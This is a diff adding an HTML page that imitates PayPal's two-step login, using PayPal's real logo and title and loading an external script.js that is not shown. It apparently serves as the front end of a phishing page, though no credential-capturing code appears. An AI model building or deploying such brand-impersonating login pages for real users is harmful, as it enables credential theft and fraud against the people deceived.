@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Log in to your PayPal account</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" alt="PayPal" class="logo">
+    <div id="email-screen">
+      <h1>Log in to PayPal</h1>
+
+      <form id="email-form">
+        <input type="email" id="email" placeholder="Email or mobile number" required>
+        <button type="submit" class="next-btn">Next</button>
+      </form>
+    </div>
+
+    <div id="password-screen" style="display: none;">
+      <h1>Welcome back</h1>
+
+      <form id="password-form">
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button type="submit" class="next-btn">Log In</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
